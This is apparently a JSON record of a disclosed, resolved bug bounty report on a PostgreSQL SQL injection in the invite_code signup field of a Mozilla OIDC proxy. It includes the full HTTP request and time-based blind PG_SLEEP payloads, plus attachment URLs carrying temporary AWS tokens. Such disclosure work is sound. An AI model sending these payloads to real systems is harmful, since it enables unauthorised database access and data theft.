@@ -1,0 +1,160 @@
+{
+  "id": 2209130,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjA5MTMw",
+  "url": "https://hackerone.com/reports/2209130",
+  "title": "SQL Injection on prod.oidc-proxy.prod.webservices.mozgcp.net via invite_code parameter - Mozilla social inscription",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2023-10-14T12:47:48.522Z",
+  "submitted_at": "2023-10-14T12:47:48.736Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "supr4s",
+    "url": "/supr4s",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/cnms4l7faunf0sht0ox61ouwsqlj/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 63475,
+    "url": "https://hackerone.com/mozilla_critical_services",
+    "handle": "mozilla_critical_services",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/aa8lqjkx88jd2epgey2sk75jq83b/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/aa8lqjkx88jd2epgey2sk75jq83b/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Mozilla Critical Services",
+      "twitter_handle": "",
+      "website": "https://www.mozilla.org",
+      "about": "Mozilla web bug bounty program specific to encouraging security research in Mozilla's critical backend services and tools used by the Firefox browser"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2024-01-30T13:29:52.510Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-01-30T12:11:25.989Z",
+  "team_member_agreed_on_going_public_at": "2024-01-30T13:29:52.362Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi everyone,\n\nHope you are well ! \n\nI wanted to play on [https://mozilla.social](https://mozilla.social), however this requires a user account and an invitation code as it's not open to the public. When entering an invitation code, the user is redirected to `prod.oidc-proxy.prod.webservices.mozgcp.net`.\n\n{F2773206}\n\nPlaying around with what's on offer, I've noticed that the `invite_code` parameter is vulnerable to a PostgreSQL injection.\n\n## Steps To Reproduce:\n\nDuring registration, the following POST request is made : \n\n```\nPOST /interaction/KTTbkN8LaJgYIb7fIwPYX/signup HTTP/2\nHost: prod.oidc-proxy.prod.webservices.mozgcp.net\nCookie: <session_cookies>\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.9999.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 119\nOrigin: null\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nSec-Ch-Ua-Platform: \"macOS\"\nSec-Ch-Ua: \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\", \"Not=A?Brand\";v=\"24\"\nSec-Ch-Ua-Mobile: ?0\nTe: trailers\n\nhandle=xxx&display_name=xxx&invite_code=xxx-&age=25&terms=on&rules=on\n```\n\nAdding a single quote to the `invite_code` parameter returns a 500 error, and adding a second quote returns a 200. **Red flag**\n\nAfter a few tests, here is a time-based blind payload to confirm the vulnerability : \n\n```\ninvite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--\n```\n\n{F2773210}\n\nConfirm with the response from the server - which takes 5 seconds to reply.\n\nNow, 10 seconds : \n\n```\ninvite_code=xxx');(SELECT 4564 FROM PG_SLEEP(10))--\n```\n\n{F2773214}\n\nSame here, 10 secs before getting an answer.\n\n20 sec : \n\n```\ninvite_code=xxx');(SELECT 4564 FROM PG_SLEEP(20))--\n```\n\n{F2773218}\n\netc.\n\n## Impact\n\nFrom [OWASP](https://owasp.org/www-community/attacks/SQL_Injection) : \n\n> A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.\n\nI'm working on a data exfiltration and will update the report as needed.\n\nLooking forward to exchanging.\n\nRegards,\nSupr4s",
+  "weakness": {
+    "id": 67,
+    "name": "SQL Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 2773206,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/0k9uqbeq9vgmlcqnh352jasy78lz?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSE3YBQWZ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDlVPnmhGDnF2FIqu8OeWSNu6ZCGP7K%2FIZ584pBMUGeGAIgAdqS8TdHBm9YaTgyxQyrT%2B7JTDJ2zUCM465yBI8ZrkQqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDFk9aYVaKi5NhxRkziqPBWumDGkXLiQJGUnXbGOfzB9y5GZ7sqcwFPOyBRMOMgGYeEW6C6wsENB0cveexpvlR%2FsBZRvR%2FkkHLnCFcsBrOl2TfYk46o%2BtovmWcAGZipZQWXCs88k3jTlNi8Fleqa%2FwuH3tZMCvP9JZjFgkb4ee81gm7TtzXQCU7lJ0rRBupeTzC%2B5l6uFm4v%2Fg%2F%2BswGlvpy%2FDK1JGqGjVJzYykZsNRn%2B7sga8nMtD%2FGqnDMwopI8%2FfQbqF6dairOzC85LlKs5%2BIwSpj8BGMxUkGrvsZ14LYuBr7SmbohNDoNXzKanlg4zTzpcoaznWHGhAtBfotcIWo2%2FWEgAEgLNo6UVCQ%2FB3mzBWHupyHATQudWHZl%2BgKAVy8jxkoje8v7WCZKZPk5BFkq%2Fy2E1wy779lOR4LVTAlRMNF1iNiHqXVI55PASk3hHIEKQZIqIbYQSc7h6ADuVg2IgEQWAk5BnltwvRlQMlru72ti%2FQE4fx5AWZ86meZOWdz0uTnqmMM7QXZ8d6f3huUFYhSW%2BgeQJIYQEw1L4ketxu4wfp9vOS9dceLaE74ZR2%2F1gHvHgIontS%2FSNDBxqgn92TuTNrUbTt8QKch95GV9Yln6YSTzna0qTDPOIKoKLpBa%2FKLEgu7Q1QzqvKa1kgIO38XHmf37Z%2BPQ4RyCflmNGMQ8I15GF0Vb40li%2BwZB6RW0mybr%2BKBdW9O%2BwdJlYcaLqRS7v6u6MQB1PGwCI%2FVNKUdBpvcrY0ssEU3frEAokr489TW9X04xPSxcIG7JH5ljFoe5XF6QhwrCU85thXN2yk7WckO1ctlBR%2BhE3ozmq9Yr1kBVoLdAS%2FwJlXH7ItDFw8zI2rWviwPhgqFu6%2BRbkZ2tFCDoMFwg9Mx%2FgVvwwneitrgY6sQGK3hTqL%2FYWyb0GigKD%2B%2FFXXC3k7uMsLRERvoovJXCCbrtgiFp5NZLvg1qaY%2B128LQ%2FWQvLgeZmOwY20VPjts6qGbczdARtfMQ3dS5XbQ1WoZEouLD0VTr6EnwLRX%2F9Ews0j64zrUsEcwpgPmSBDUQVSsHBxY%2Bs6EnWg3hZ6VZU6pMQJ1g%2FnHIQ52ejJAtRLVo5Q03BbXORH23pl7zd%2BiSJPGHJetpGGx%2BuZWn399yCSsA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0a200802fdf202bdf9d58726595f6d5be458558701a9661a81143c8090ab69e3",
+      "file_size": 185251,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 2773210,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/svwjatw8qd4u3uld7nath6ylgmr2?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSE3YBQWZ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDlVPnmhGDnF2FIqu8OeWSNu6ZCGP7K%2FIZ584pBMUGeGAIgAdqS8TdHBm9YaTgyxQyrT%2B7JTDJ2zUCM465yBI8ZrkQqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDFk9aYVaKi5NhxRkziqPBWumDGkXLiQJGUnXbGOfzB9y5GZ7sqcwFPOyBRMOMgGYeEW6C6wsENB0cveexpvlR%2FsBZRvR%2FkkHLnCFcsBrOl2TfYk46o%2BtovmWcAGZipZQWXCs88k3jTlNi8Fleqa%2FwuH3tZMCvP9JZjFgkb4ee81gm7TtzXQCU7lJ0rRBupeTzC%2B5l6uFm4v%2Fg%2F%2BswGlvpy%2FDK1JGqGjVJzYykZsNRn%2B7sga8nMtD%2FGqnDMwopI8%2FfQbqF6dairOzC85LlKs5%2BIwSpj8BGMxUkGrvsZ14LYuBr7SmbohNDoNXzKanlg4zTzpcoaznWHGhAtBfotcIWo2%2FWEgAEgLNo6UVCQ%2FB3mzBWHupyHATQudWHZl%2BgKAVy8jxkoje8v7WCZKZPk5BFkq%2Fy2E1wy779lOR4LVTAlRMNF1iNiHqXVI55PASk3hHIEKQZIqIbYQSc7h6ADuVg2IgEQWAk5BnltwvRlQMlru72ti%2FQE4fx5AWZ86meZOWdz0uTnqmMM7QXZ8d6f3huUFYhSW%2BgeQJIYQEw1L4ketxu4wfp9vOS9dceLaE74ZR2%2F1gHvHgIontS%2FSNDBxqgn92TuTNrUbTt8QKch95GV9Yln6YSTzna0qTDPOIKoKLpBa%2FKLEgu7Q1QzqvKa1kgIO38XHmf37Z%2BPQ4RyCflmNGMQ8I15GF0Vb40li%2BwZB6RW0mybr%2BKBdW9O%2BwdJlYcaLqRS7v6u6MQB1PGwCI%2FVNKUdBpvcrY0ssEU3frEAokr489TW9X04xPSxcIG7JH5ljFoe5XF6QhwrCU85thXN2yk7WckO1ctlBR%2BhE3ozmq9Yr1kBVoLdAS%2FwJlXH7ItDFw8zI2rWviwPhgqFu6%2BRbkZ2tFCDoMFwg9Mx%2FgVvwwneitrgY6sQGK3hTqL%2FYWyb0GigKD%2B%2FFXXC3k7uMsLRERvoovJXCCbrtgiFp5NZLvg1qaY%2B128LQ%2FWQvLgeZmOwY20VPjts6qGbczdARtfMQ3dS5XbQ1WoZEouLD0VTr6EnwLRX%2F9Ews0j64zrUsEcwpgPmSBDUQVSsHBxY%2Bs6EnWg3hZ6VZU6pMQJ1g%2FnHIQ52ejJAtRLVo5Q03BbXORH23pl7zd%2BiSJPGHJetpGGx%2BuZWn399yCSsA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5f6d134e1df3b2e099573359d71f77805b47f63001db9709bcbc8da77c01cf95",
+      "file_size": 199446,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 2773214,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yk6juiwrad3pz0gb7dznpketunli?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSE3YBQWZ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDlVPnmhGDnF2FIqu8OeWSNu6ZCGP7K%2FIZ584pBMUGeGAIgAdqS8TdHBm9YaTgyxQyrT%2B7JTDJ2zUCM465yBI8ZrkQqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDFk9aYVaKi5NhxRkziqPBWumDGkXLiQJGUnXbGOfzB9y5GZ7sqcwFPOyBRMOMgGYeEW6C6wsENB0cveexpvlR%2FsBZRvR%2FkkHLnCFcsBrOl2TfYk46o%2BtovmWcAGZipZQWXCs88k3jTlNi8Fleqa%2FwuH3tZMCvP9JZjFgkb4ee81gm7TtzXQCU7lJ0rRBupeTzC%2B5l6uFm4v%2Fg%2F%2BswGlvpy%2FDK1JGqGjVJzYykZsNRn%2B7sga8nMtD%2FGqnDMwopI8%2FfQbqF6dairOzC85LlKs5%2BIwSpj8BGMxUkGrvsZ14LYuBr7SmbohNDoNXzKanlg4zTzpcoaznWHGhAtBfotcIWo2%2FWEgAEgLNo6UVCQ%2FB3mzBWHupyHATQudWHZl%2BgKAVy8jxkoje8v7WCZKZPk5BFkq%2Fy2E1wy779lOR4LVTAlRMNF1iNiHqXVI55PASk3hHIEKQZIqIbYQSc7h6ADuVg2IgEQWAk5BnltwvRlQMlru72ti%2FQE4fx5AWZ86meZOWdz0uTnqmMM7QXZ8d6f3huUFYhSW%2BgeQJIYQEw1L4ketxu4wfp9vOS9dceLaE74ZR2%2F1gHvHgIontS%2FSNDBxqgn92TuTNrUbTt8QKch95GV9Yln6YSTzna0qTDPOIKoKLpBa%2FKLEgu7Q1QzqvKa1kgIO38XHmf37Z%2BPQ4RyCflmNGMQ8I15GF0Vb40li%2BwZB6RW0mybr%2BKBdW9O%2BwdJlYcaLqRS7v6u6MQB1PGwCI%2FVNKUdBpvcrY0ssEU3frEAokr489TW9X04xPSxcIG7JH5ljFoe5XF6QhwrCU85thXN2yk7WckO1ctlBR%2BhE3ozmq9Yr1kBVoLdAS%2FwJlXH7ItDFw8zI2rWviwPhgqFu6%2BRbkZ2tFCDoMFwg9Mx%2FgVvwwneitrgY6sQGK3hTqL%2FYWyb0GigKD%2B%2FFXXC3k7uMsLRERvoovJXCCbrtgiFp5NZLvg1qaY%2B128LQ%2FWQvLgeZmOwY20VPjts6qGbczdARtfMQ3dS5XbQ1WoZEouLD0VTr6EnwLRX%2F9Ews0j64zrUsEcwpgPmSBDUQVSsHBxY%2Bs6EnWg3hZ6VZU6pMQJ1g%2FnHIQ52ejJAtRLVo5Q03BbXORH23pl7zd%2BiSJPGHJetpGGx%2BuZWn399yCSsA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e581e01dd74fd6159d784db574f60727341d32e108a808c486c9364760d45467",
+      "file_size": 199524,
+      "type": "image/png",
+      "moderated": false
+    },
+    {
+      "id": 2773218,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/srhmovinblweh1wcoqmdrofud065?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSE3YBQWZ%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T143949Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDlVPnmhGDnF2FIqu8OeWSNu6ZCGP7K%2FIZ584pBMUGeGAIgAdqS8TdHBm9YaTgyxQyrT%2B7JTDJ2zUCM465yBI8ZrkQqsgUIdxADGgwwMTM2MTkyNzQ4NDkiDFk9aYVaKi5NhxRkziqPBWumDGkXLiQJGUnXbGOfzB9y5GZ7sqcwFPOyBRMOMgGYeEW6C6wsENB0cveexpvlR%2FsBZRvR%2FkkHLnCFcsBrOl2TfYk46o%2BtovmWcAGZipZQWXCs88k3jTlNi8Fleqa%2FwuH3tZMCvP9JZjFgkb4ee81gm7TtzXQCU7lJ0rRBupeTzC%2B5l6uFm4v%2Fg%2F%2BswGlvpy%2FDK1JGqGjVJzYykZsNRn%2B7sga8nMtD%2FGqnDMwopI8%2FfQbqF6dairOzC85LlKs5%2BIwSpj8BGMxUkGrvsZ14LYuBr7SmbohNDoNXzKanlg4zTzpcoaznWHGhAtBfotcIWo2%2FWEgAEgLNo6UVCQ%2FB3mzBWHupyHATQudWHZl%2BgKAVy8jxkoje8v7WCZKZPk5BFkq%2Fy2E1wy779lOR4LVTAlRMNF1iNiHqXVI55PASk3hHIEKQZIqIbYQSc7h6ADuVg2IgEQWAk5BnltwvRlQMlru72ti%2FQE4fx5AWZ86meZOWdz0uTnqmMM7QXZ8d6f3huUFYhSW%2BgeQJIYQEw1L4ketxu4wfp9vOS9dceLaE74ZR2%2F1gHvHgIontS%2FSNDBxqgn92TuTNrUbTt8QKch95GV9Yln6YSTzna0qTDPOIKoKLpBa%2FKLEgu7Q1QzqvKa1kgIO38XHmf37Z%2BPQ4RyCflmNGMQ8I15GF0Vb40li%2BwZB6RW0mybr%2BKBdW9O%2BwdJlYcaLqRS7v6u6MQB1PGwCI%2FVNKUdBpvcrY0ssEU3frEAokr489TW9X04xPSxcIG7JH5ljFoe5XF6QhwrCU85thXN2yk7WckO1ctlBR%2BhE3ozmq9Yr1kBVoLdAS%2FwJlXH7ItDFw8zI2rWviwPhgqFu6%2BRbkZ2tFCDoMFwg9Mx%2FgVvwwneitrgY6sQGK3hTqL%2FYWyb0GigKD%2B%2FFXXC3k7uMsLRERvoovJXCCbrtgiFp5NZLvg1qaY%2B128LQ%2FWQvLgeZmOwY20VPjts6qGbczdARtfMQ3dS5XbQ1WoZEouLD0VTr6EnwLRX%2F9Ews0j64zrUsEcwpgPmSBDUQVSsHBxY%2Bs6EnWg3hZ6VZU6pMQJ1g%2FnHIQ52ejJAtRLVo5Q03BbXORH23pl7zd%2BiSJPGHJetpGGx%2BuZWn399yCSsA%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a261de84f10836a8bdf44db939d456a62ed251af234f7144167a354e7dbab929",
+      "file_size": 198086,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2024-02-29T12:11:26.078Z",
+  "allow_singular_disclosure_after": 1373496.07916425,
+  "singular_disclosure_allowed": false,
+  "vote_count": 53,
+  "voters": [
+    "awhacken",
+    "n1m0",
+    "yxw21",
+    "zy9ard3",
+    "roland_hack",
+    "20kilograma",
+    "supr4s",
+    "address_below0",
+    "exec_iq",
+    "shubham_srt",
+    "and 43 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
